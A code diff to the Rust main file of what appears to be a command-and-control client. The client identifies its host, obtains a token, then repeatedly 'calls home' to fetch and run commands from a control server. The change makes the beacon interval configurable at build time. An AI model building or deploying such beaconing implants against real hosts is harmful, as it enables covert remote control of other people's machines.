@@ -4,6 +4,7 @@ use std::{
     thread,
     time,
 };
+use std::time::Duration;
 
 mod communication;
 mod utils;
@@ -16,7 +17,9 @@ use crate::models::{
 mod tasks;
 mod models;
 
-const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
+//const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);
+const POLLING_TIME: &'static str = env!("POLLING_TIME");
+const DEFAULT_POLLING_TIME: u64 = 10;
 
 /// Fetches commands from the control server and runs them, then returns task results to control
 /// server
@@ -67,10 +70,10 @@ async fn call_home(token: &String) {
 ///
 /// # Returns
 /// The clients authorization token to be used on further requests to the control server.
-async fn initialise_client() -> String {
+async fn initialise_client(polling_time: u64) -> String {
     let mut token: String;
     loop {
-        let id = utils::get_host_identify();
+        let id = utils::get_host_identify(polling_time);
         token = match communication::send_identity(id).await {
             Ok(val) => val,
             Err(e) => {
@@ -83,7 +86,7 @@ async fn initialise_client() -> String {
         if token != String::from("") {
             break;
         }
-        thread::sleep(POLL_SLEEP);
+        thread::sleep(Duration::from_secs(polling_time));
     }
     #[cfg(debug_assertions)]
     println!("Client initialised");
@@ -92,10 +95,12 @@ async fn initialise_client() -> String {
 
 #[tokio::main]
 async fn main() -> Result<(), anyhow::Error> {
-    let token: String = initialise_client().await;
+    let polling_time = POLLING_TIME.parse().unwrap_or(DEFAULT_POLLING_TIME);
+    let token: String = initialise_client(polling_time).await;
+
     loop {
         call_home(&token).await;
-        thread::sleep(POLL_SLEEP);
+        thread::sleep(Duration::from_secs(polling_time));
     }
 
     // Ok(())
